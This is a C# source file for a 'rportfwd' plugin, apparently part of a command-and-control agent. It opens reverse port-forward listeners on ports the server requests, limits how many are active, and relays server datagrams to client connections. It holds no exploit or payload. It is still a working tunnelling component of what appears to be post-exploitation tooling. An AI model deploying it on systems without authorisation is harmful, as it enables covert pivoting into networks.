using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;
using System.Collections.Concurrent;

namespace Agent
{
    public class Plugin : IPlugin, IProxyPlugin
    {
        public const int DefaultMaxActiveListeners = 128;
        public string Name => "rportfwd";
        private IMessageManager messageManager { get; set; }
        private ILogger logger { get; set; }
        private ConcurrentDictionary<int, ConnectionConfig> connections { get; set; }
        private readonly ConcurrentDictionary<int, ConnectionConfig> clientOwners = new();
        private readonly HashSet<int> startingPorts = new HashSet<int>();
        private readonly object connectionsLock = new object();
        private readonly int maxActiveListeners;
        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
            : this(messageManager, config, logger, tokenManager, spawner, pythonManager, DefaultMaxActiveListeners)
        {
        }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager, int maxActiveListeners)
        {
            if (maxActiveListeners <= 0)
                throw new ArgumentOutOfRangeException(nameof(maxActiveListeners));
            this.messageManager = messageManager;
            this.connections = new ConcurrentDictionary<int, ConnectionConfig>();
            this.logger = logger;
            this.maxActiveListeners = maxActiveListeners;
        }

        public async Task Execute(ServerJob job)
        {
            var parameters = Misc.ConvertJsonStringToDict(job.task.parameters);
            int port;
            if (int.TryParse(parameters["lport"], out port))
            {
                ConnectionConfig? cc = null;
                string? admissionError = null;
                lock (connectionsLock)
                {
                    if (connections.ContainsKey(port) || startingPorts.Contains(port))
                        admissionError = "Port in use.";
                    else if (connections.Count + startingPorts.Count >= maxActiveListeners)
                        admissionError = "Active listener limit reached.";
                    else
                    {
                        cc = new ConnectionConfig(
                            port,
                            messageManager,
                            tryRegisterClientId: TryRegisterClientId,
                            unregisterClientId: UnregisterClientId);
                        startingPorts.Add(port);
                    }
                }

                if (admissionError != null || cc == null)
                {
                    await ReturnError(admissionError ?? "Failed to reserve listener.", job.task.id);
                    return;
                }

                try
                {
                    await cc.StartAsync();
                }
                catch (Exception ex)
                {
                    lock (connectionsLock)
                    {
                        startingPorts.Remove(port);
                    }
                    await ReturnError($"Failed to start listener: {ex.Message}", job.task.id);
                    return;
                }

                lock (connectionsLock)
                {
                    startingPorts.Remove(port);
                    connections.TryAdd(port, cc);
                }

                messageManager.AddTaskResponse(new TaskResponse()
                {
                    task_id = job.task.id,
                    user_output = "Listening.",
                    completed = true
                });
                return;
            }

            await ReturnError("Failed to parse port, please use a valid numerical value.", job.task.id);

            return;
        }

        public async Task<bool> StopAsync(int port)
        {
            ConnectionConfig? connection;
            lock (connectionsLock)
            {
                if (!connections.TryRemove(port, out connection))
                    return false;
            }

            await connection.StopAsync();
            return true;
        }

        public async Task HandleDatagram(ServerDatagram sm)
        {
            if (clientOwners.TryGetValue(sm.server_id, out ConnectionConfig? owner))
                await owner.HandleMessage(sm).ConfigureAwait(false);
        }

        private bool TryRegisterClientId(int clientId, ConnectionConfig owner) =>
            clientOwners.TryAdd(clientId, owner);

        private void UnregisterClientId(int clientId, ConnectionConfig owner) =>
            clientOwners.TryRemove(new KeyValuePair<int, ConnectionConfig>(clientId, owner));

        private async Task ReturnError(string message, string task_id)
        {
            messageManager.AddTaskResponse(new TaskResponse()
            {
                task_id = task_id,
                user_output = message,
                status = "error",
                completed = true
            });
        }
    }
}
